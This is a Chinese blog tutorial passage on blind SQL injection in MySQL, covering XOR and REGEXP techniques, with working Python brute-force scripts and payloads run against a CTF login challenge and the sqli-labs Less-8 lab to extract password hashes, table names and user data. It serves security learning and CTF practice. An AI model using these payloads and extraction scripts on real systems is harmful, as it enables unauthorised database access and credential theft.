<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>SQL注入中的点点滴滴 - greetdawn&#039;s Blog</title><link rel="manifest" href="/manifest.json"><meta name="theme-color" content="#3273dc"><meta name="application-name" content="greetdawn&#039;s Site"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="msapplication-TileColor" content="#3273dc"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="greetdawn&#039;s Site"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content=""><meta property="og:type" content="blog"><meta property="og:title" content="SQL注入中的点点滴滴"><meta property="og:url" content="http://www.greetdawn.top/2021/02/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/sql-injection/sql-injection-advanced/"><meta property="og:site_name" content="greetdawn&#039;s Blog"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/5.jpg"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/20210122163621.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/20210122163812.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/20210122164009.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/20210122164141.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/20210125104720.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/20210125105745.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/20210125110031.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/20210125154937.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/20210125155105.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/20210125155204.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/20210126093916.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/20210127112311.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/20210127133019.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/20210127132939.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/20210127133432.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/20210127133521.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/20210128093143.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/20210128094918.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/20210128100811.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128104911961.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128145525282.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128145613197.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128145657274.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128145734590.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128145837778.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128154554855.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128161307478.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128161402835.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128161507494.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128161756298.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128162804831.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128164413693.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128180359265.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128180506380.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128180652574.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128180652574.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128150312508.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128150415389.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128150542009.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128150618966.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128150640389.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128150840816.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128150906850.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128151053028.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128151119696.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128151124989.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128151147487.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128151215700.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128151235080.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128151249140.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128151303856.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128151316265.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128193107498.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128193219077.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210129133636903.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210129134724322.png"><meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210129143131058.png"><meta property="article:published_time" content="2021-02-01T02:44:14.000Z"><meta property="article:modified_time" content="2021-02-01T02:50:35.694Z"><meta property="article:author" content="丨greetdawn丨"><meta property="article:tag" content="sql-injection"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/5.jpg"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://www.greetdawn.top/2021/02/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/sql-injection/sql-injection-advanced/"},"headline":"SQL注入中的点点滴滴","image":["https://gitee.com/greetdawn/blogImages/raw/master/img/5.jpg","https://gitee.com/greetdawn/blogImages/raw/master/img/20210122163621.png","https://gitee.com/greetdawn/blogImages/raw/master/img/20210122163812.png","https://gitee.com/greetdawn/blogImages/raw/master/img/20210122164009.png","https://gitee.com/greetdawn/blogImages/raw/master/img/20210122164141.png","https://gitee.com/greetdawn/blogImages/raw/master/img/20210125104720.png","https://gitee.com/greetdawn/blogImages/raw/master/img/20210125105745.png","https://gitee.com/greetdawn/blogImages/raw/master/img/20210125110031.png","https://gitee.com/greetdawn/blogImages/raw/master/img/20210125154937.png","https://gitee.com/greetdawn/blogImages/raw/master/img/20210125155105.png","https://gitee.com/greetdawn/blogImages/raw/master/img/20210125155204.png","https://gitee.com/greetdawn/blogImages/raw/master/img/20210126093916.png","https://gitee.com/greetdawn/blogImages/raw/master/img/20210127112311.png","https://gitee.com/greetdawn/blogImages/raw/master/img/20210127133019.png","https://gitee.com/greetdawn/blogImages/raw/master/img/20210127132939.png","https://gitee.com/greetdawn/blogImages/raw/master/img/20210127133432.png","https://gitee.com/greetdawn/blogImages/raw/master/img/20210127133521.png","https://gitee.com/greetdawn/blogImages/raw/master/img/20210128093143.png","https://gitee.com/greetdawn/blogImages/raw/master/img/20210128094918.png","https://gitee.com/greetdawn/blogImages/raw/master/img/20210128100811.png","https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128104911961.png","https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128145525282.png","https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128145613197.png","https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128145657274.png","https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128145734590.png","https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128145837778.png","https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128154554855.png","https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128161307478.png","https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128161402835.png","https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128161507494.png","https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128161756298.png","https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128162804831.png","https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128164413693.png","https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128180359265.png","https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128180506380.png","https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128180652574.png","https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128180652574.png","https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128150312508.png","https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128150415389.png","https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128150542009.png","https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128150618966.png","https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128150640389.png","https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128150840816.png","https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128150906850.png","https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128151053028.png","https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128151119696.png","https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128151124989.png","https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128151147487.png","https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128151215700.png","https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128151235080.png","https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128151249140.png","https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128151303856.png","https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128151316265.png","https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128193107498.png","https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128193219077.png","https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210129133636903.png","https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210129134724322.png","https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210129143131058.png"],"datePublished":"2021-02-01T02:44:14.000Z","dateModified":"2021-02-01T02:50:35.694Z","author":{"@type":"Person","name":"丨greetdawn丨"},"publisher":{"@type":"Organization","name":"greetdawn's Blog","logo":{"@type":"ImageObject","url":{"text":"greetdawn's Site"}}},"description":""}</script><link rel="canonical" href="http://www.greetdawn.top/2021/02/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/sql-injection/sql-injection-advanced/"><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.2/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/monokai-sublime.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Oxanium:wght@300;400;600&amp;family=Roboto+Mono"><link rel="stylesheet" href="/css/cyberpunk.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><script>var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "//hm.baidu.com/hm.js?0504a401a4e9d23a231f260a409feec4";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();</script><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }
          Array
              .from(document.querySelectorAll('.tab-content'))
              .forEach($tab => {
                  $tab.classList.add('is-hidden');
              });
          Array
              .from(document.querySelectorAll('.tabs li'))
              .forEach($tab => {
                  $tab.classList.remove('is-active');
              });
          const $activeTab = document.querySelector(location.hash);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
          const $tabMenu = document.querySelector(`a[href="${location.hash}"]`);
          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="greetdawn's Blog" type="application/atom+xml">
</head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/">greetdawn&#039;s Site</a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">主页</a><a class="navbar-item" href="/archives">归档</a><a class="navbar-item" href="/categories">分类</a><a class="navbar-item" href="/tags">标签</a><a class="navbar-item" href="/about">关于</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/Greetdawn"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-02-01T02:44:14.000Z" title="2021/2/1 上午10:44:14">2021-02-01</time>发表</span><span class="level-item"><time dateTime="2021-02-01T02:50:35.694Z" title="2021/2/1 上午10:50:35">2021-02-01</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a></span><span class="level-item">1 小时读完 (大约7314个字)</span><span class="level-item" id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv">0</span>次访问</span></div></div><h1 class="title is-3 is-size-4-mobile">SQL注入中的点点滴滴</h1><div class="content"><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/5.jpg" alt="5"></p>
<span id="more"></span>

<h1 id="盲注中的多种技巧"><a href="#盲注中的多种技巧" class="headerlink" title="盲注中的多种技巧"></a>盲注中的多种技巧</h1><h2 id="XOR盲注-异或盲注"><a href="#XOR盲注-异或盲注" class="headerlink" title="XOR盲注(异或盲注)"></a>XOR盲注(异或盲注)</h2><h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>异或是一种逻辑运算。</p>
<p>运算法则：</p>
<p>两个条件相同(同真或同假)即为假(0)，两个条件不同即为真（1）；</p>
<p>null与任何条件做异或运算都为null，如果从数学的角度理解就是，空集与任何集合的交集都为空。</p>
<p>mysql里异或运算符为<code>^ </code>或者 <code>xor</code>；</p>
<p>两个同为真的条件做异或，结果为假</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210122163621.png"></p>
<p>两个同为假的条件做异或，结果为假</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210122163812.png"></p>
<p>一个条件为真，一个条件为假，结果为假</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210122164009.png"></p>
<p>null与任何条件（真、假、null）做异或，结果都为null</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210122164141.png"></p>
<h3 id="题目环境"><a href="#题目环境" class="headerlink" title="题目环境"></a>题目环境</h3><p><code>http://123.206.31.85:49167/index.php</code></p>
<p><code>xor</code>注入的基本思路是：在<code>MySQL</code>中异或的符号是<code>^</code>，该符号可以起到一种逻辑判断的作用，<code>0^1=1</code>、<code>0^0=0</code>这样可以形成一种布尔盲注的效果,对其中的字符进行逐一猜解即可。</p>
<h3 id="例题解析"><a href="#例题解析" class="headerlink" title="例题解析"></a>例题解析</h3><p>首先请求题目发现是一个登陆框</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210125104720.png"></p>
<p>一般对于登陆框的注入思路也就那几种，这边考察的注入出admin账户的密码。这里尝试简单的fuzz一下，发现其中过滤了<code>or</code>逗号，空格注释符等号等特殊字符，并且关键库<code>information_schema</code>也被过滤了。但是可以尝试一下payload:<code>admin&#39;^(ascii(substr((password)from(&#123;&#125;)))&gt;&#123;&#125;)#</code>，既然是盲注，那就直接上脚本好了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://123.206.31.85:49167/index.php&#x27;</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">		<span class="string">&#x27;http://&#x27;</span>: <span class="string">&#x27;127.0.0.1:8080&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">order = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">23</span>, <span class="number">129</span>):</span><br><span class="line">		data = &#123;</span><br><span class="line">			<span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin&#x27;^(ascii(substr((password)from(&#123;&#125;)))&gt;&#123;&#125;)#&quot;</span>.<span class="built_in">format</span>(order, i),</span><br><span class="line">			<span class="string">&quot;password&quot;</span>:<span class="string">&quot;asd&quot;</span></span><br><span class="line">		&#125;</span><br><span class="line">		r = requests.post(url = url, data = data, proxies=proxies, timeout = <span class="number">3</span>)</span><br><span class="line">		<span class="comment">#print(r.text)</span></span><br><span class="line">		<span class="keyword">if</span> <span class="string">&#x27;password error!&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">			sys.stdout.write(<span class="built_in">chr</span>(i))</span><br><span class="line">			sys.stdout.flush()</span><br><span class="line">			order += <span class="number">1</span></span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>跑出<code>admin</code>账户的密码<code>md5</code>值:<code>51b7a76d51e70b419f60d3473fb6f900</code></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210125105745.png"></p>
<p>尝试登录无果，直接使用<code>MD5</code>破解，得到明文字符<code>skctf123456</code></p>
<p>直接尝试登录得到<code>flag</code>:<code>SKCTF&#123;b1iNd_SQL_iNJEcti0n!&#125;</code></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210125110031.png"></p>
<h2 id="regexp-relike盲注"><a href="#regexp-relike盲注" class="headerlink" title="regexp/relike盲注"></a>regexp/relike盲注</h2><h3 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h3><p><code>REGEXP</code>注入，即<code>regexp</code>正则表达式注入。<code>REGEXP</code>注入，又叫盲注值正则表达式攻击。<br>应用场景就是盲注，原理是直接查询自己需要的数据，然后通过正则表达式进行匹配。</p>
<h3 id="regexp基本用法"><a href="#regexp基本用法" class="headerlink" title="regexp基本用法"></a>regexp基本用法</h3><ul>
<li>语法</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select (select 语句) regexp &#x27;正则&#x27;</span><br></pre></td></tr></table></figure>

<ul>
<li>标准查询语句，直接返回查询结果</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username from users where id=1;</span><br></pre></td></tr></table></figure>

<ul>
<li>正则匹配，若匹配，则返回1，不匹配返回0</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (select username from users where id=1) regexp &#x27;^d&#x27;;</span><br><span class="line">+-----------------------------------------------------+</span><br><span class="line">| (select username from users where id=1) regexp &#x27;^d&#x27; |</span><br><span class="line">+-----------------------------------------------------+</span><br><span class="line">|                                                   1 |</span><br><span class="line">+-----------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (select username from users where id=1) regexp &#x27;^e&#x27;;</span><br><span class="line">+-----------------------------------------------------+</span><br><span class="line">| (select username from users where id=1) regexp &#x27;^e&#x27; |</span><br><span class="line">+-----------------------------------------------------+</span><br><span class="line">|                                                   0 |</span><br><span class="line">+-----------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>注：<code>^</code>表示<code>pattern</code>(模式串)的开头。即若匹配到<code>username</code>字段下<code>id=1</code>的数据开头为a，则返回1；否则返回0</p>
<ul>
<li>使用<code>regexp</code>表示where条件中的=号</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where password regexp &#x27;^ad&#x27;;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  8 | admin    | admin    |</span><br><span class="line">|  9 | admin1   | admin1   |</span><br><span class="line">| 10 | admin2   | admin2   |</span><br><span class="line">| 11 | admin3   | admin3   |</span><br><span class="line">| 14 | admin4   | admin4   |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>



<h3 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h3><p><code>=、in、like</code>被过滤的情况下使用</p>
<p>若<code>^</code>被过滤，可使用<code>$</code>来从后往前进行匹配</p>
<ul>
<li>常用<code>regexp</code>正则语句：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">regexp &#x27;^[a-z]&#x27;  #判断一个表的第一个字符串是否在a-z中</span><br><span class="line">regexp &#x27;^r&#x27;      #判断第一个字符串是否为r</span><br><span class="line">regexp &#x27;^r[a-z]&#x27; #判断一个表的第二个字符串是否在a-z中</span><br></pre></td></tr></table></figure>

<ul>
<li><code>regexp</code>在联合查询中的使用</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username,password from users where id=1 union select 1,database() regexp &#x27;^s&#x27;;</span><br><span class="line">+----------+----------+</span><br><span class="line">| username | password |</span><br><span class="line">+----------+----------+</span><br><span class="line">| Dumb     | Dumb     |</span><br><span class="line">| 1        | 1        |</span><br><span class="line">+----------+----------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select username,password from users where id=1 union select 1,database() regexp &#x27;^x&#x27;;</span><br><span class="line">+----------+----------+</span><br><span class="line">| username | password |</span><br><span class="line">+----------+----------+</span><br><span class="line">| Dumb     | Dumb     |</span><br><span class="line">| 1        | 0        |</span><br><span class="line">+----------+----------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>



<h3 id="sqlilab中简单场景的运用"><a href="#sqlilab中简单场景的运用" class="headerlink" title="sqlilab中简单场景的运用"></a>sqlilab中简单场景的运用</h3><p><code>sqli-labs</code>靶场<code>Less-8</code>是一个简单的布尔盲注实验环境，这个实验环境是没有经过任何过滤的。</p>
<ul>
<li>判断库的长度</li>
</ul>
<p><code>&#39;or (length(database())=8)--+</code>  #返回正常</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210125154937.png"></p>
<ul>
<li>判断库名</li>
</ul>
<p><code>&#39; or database() regexp &#39;^s&#39;--+</code>  #返回正常</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210125155105.png"></p>
<p><code>&#39; or database() regexp &#39;y$&#39;--+</code>   #返回正常</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210125155204.png"></p>
<p>既然这么简单，就直接上个脚本一把梭</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/env python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">strs = string.printable</span><br><span class="line"></span><br><span class="line">payloads = &#123;</span><br><span class="line">	<span class="string">&quot;dbname&quot;</span>: <span class="string">&quot;&#x27;or database() regexp &#x27;^&#123;&#125;&#x27;--+&quot;</span>,</span><br><span class="line">	<span class="string">&quot;table_name&quot;</span>: <span class="string">&quot;&#x27;or (select table_name from information_schema.tables where table_schema=database() limit 1,1) regexp &#x27;^&#123;&#125;&#x27;--+&quot;</span>,</span><br><span class="line">	<span class="string">&quot;column_name&quot;</span>: <span class="string">&quot;&#x27;or (select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1) regexp &#x27;^&#123;&#125;&#x27;--+&quot;</span>,</span><br><span class="line">	<span class="string">&quot;data&quot;</span>: <span class="string">&quot;&#x27;or (select username from users limit 1,1) regexp &#x27;^&#123;&#125;&#x27;--+&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.1.191:32769/Less-8/?id=&quot;</span></span><br><span class="line"></span><br><span class="line">temp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	<span class="keyword">for</span> <span class="built_in">str</span> <span class="keyword">in</span> strs:</span><br><span class="line">		payload = url + payloads[<span class="string">&#x27;data&#x27;</span>].<span class="built_in">format</span>(temp + <span class="built_in">str</span>)</span><br><span class="line">		r = requests.get(url = payload)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&#x27;You are in&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">			sys.stdout.write(<span class="built_in">str</span>)</span><br><span class="line">			sys.stdout.flush()		</span><br><span class="line">			temp += <span class="built_in">str</span></span><br><span class="line">			<span class="keyword">break</span></span><br><span 